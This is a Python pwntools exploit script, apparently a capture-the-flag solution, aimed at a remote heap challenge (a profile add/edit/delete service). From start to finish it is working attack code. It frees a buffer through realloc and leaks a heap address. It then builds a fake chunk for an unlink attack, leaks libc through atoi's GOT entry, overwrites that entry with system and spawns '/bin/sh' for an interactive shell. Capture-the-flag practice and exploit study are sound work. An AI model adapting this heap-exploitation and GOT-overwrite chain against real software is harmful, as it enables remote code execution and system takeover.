from pwn import *

context.arch = 'amd64'

host = '127.0.0.1'
port = 8888
host = 'csie.ctf.tw'
port = 10140
r = remote(host, port)

# input('Enter')
sleep(0.1)

def add_profile(name, age, len_desc, desc):
    r.recvuntil(':')
    r.sendline(b'1')
    r.recvuntil(':') # name
    payload = name.ljust(0x10, b'\x00') + str(age).encode()
    r.sendline(payload)
    r.recvuntil(':') # age
    r.recvuntil(':') # len_desc
    r.sendline(str(len_desc).encode())
    r.recvuntil(':') # desc
    r.send(desc.ljust(len_desc-1, b'\x00')[:len_desc-1])

def show_profile(idx):
    r.recvuntil(':')
    r.sendline(b'2')
    r.recvuntil(':')
    r.sendline(str(idx).encode())

def edit_profile(idx, name, age, desc):
    r.recvuntil(':')
    r.sendline(b'3')
    r.recvuntil(':') # idx
    r.sendline(str(idx).encode())
    r.recvuntil(':') # name
    payload = name.ljust(0x10, b'\x00') + str(age).encode()
    r.sendline(payload)
    r.recvuntil(':') # age
    r.recvuntil(':') # desc
    r.send(desc)

def edit_profile_free_name(idx):
    r.recvuntil(':')
    r.sendline(b'3')
    r.recvuntil(':')
    r.sendline(str(idx).encode())
    r.recvuntil(':')
    r.sendline(b'\x00')
    r.recvuntil('Realloc Error !')

def delete_profile(idx):
    r.recvuntil(':')
    r.sendline(b'4')
    r.recvuntil(':')
    r.sendline(str(idx).encode())

profile = 0x0000000000602100

# TODO: remove unnecessary inputs
add_profile(p64(0xaaaaaaaaaaaaaaaa)*2, 0x1111, 0x90, p64(0x1111111111111111)) # 0
add_profile(p64(0xaaaaaaaaaaaaaaaa)*2, 0x1111, 0x92, flat([0x2222222222222222]*18+[0x21])) # 1
delete_profile(0)
edit_profile_free_name(1)
edit_profile(1, p64(0x11), 0x1111, p64(0x1111111111111111))

# leak heap
# TODO: this one may be combined with the next one
show_profile(1)
r.recvuntil('Name : ')
heap = u64(r.recvuntil('\n')[:-1].ljust(8, b'\x00')) - 0x11
print('heap:', hex(heap))
r.recvuntil('Desc : ')
r.recvuntil('\n')

# add fake_chunk
sec_malloc = heap + 0x178
edit_profile(1, p64(sec_malloc & 0xffff), 0x1111, p64(0x1111111111111111))
add_profile(p64(0xaaaaaaaaaaaaaaaa)*2, 0x1111, 0x90, p64(0x1111111111111111)) # 0
edit_profile_free_name(0)
add_profile(p64(0xaaaaaaaaaaaaaaaa)*2, 0x1111, 0x90, p64(0x1111111111111111)) # 2
add_profile(p64(0xa0), 0x1111, 0x90, p64(0x1111111111111111)) # 3
fake_chunk = flat([0x30, 0x90, profile+0x28-0x18, profile+0x28-0x10] + [0x3333333333333333]*14)
fake_chunk += p64(0x90)[:-7]
edit_profile(1, p64(0x2222222222222222), 0x2222, fake_chunk)

delete_profile(2)

# leak system
atoi_got = 0x0000000000602098
atoi_off = 0x36e80
edit_profile(1, p64(0xaaaaaaaaaaaaaaaa), 0x3333, p64(atoi_got)[:4])
show_profile(0)
r.recvuntil('Desc : ')
atoi = u64(r.recvuntil('\n')[:-1].ljust(8, b'\x00'))
print('atoi:', hex(atoi))
libc = atoi - atoi_off
system = libc + 0x45390
print('system:', hex(system))

# overwrite atoi_got
edit_profile(0, p64(0xaaaaaaaaaaaaaaaa), 0x3333, p64(system)[:6])

r.recvuntil(':')
r.sendline(b'/bin/sh')

r.interactive()
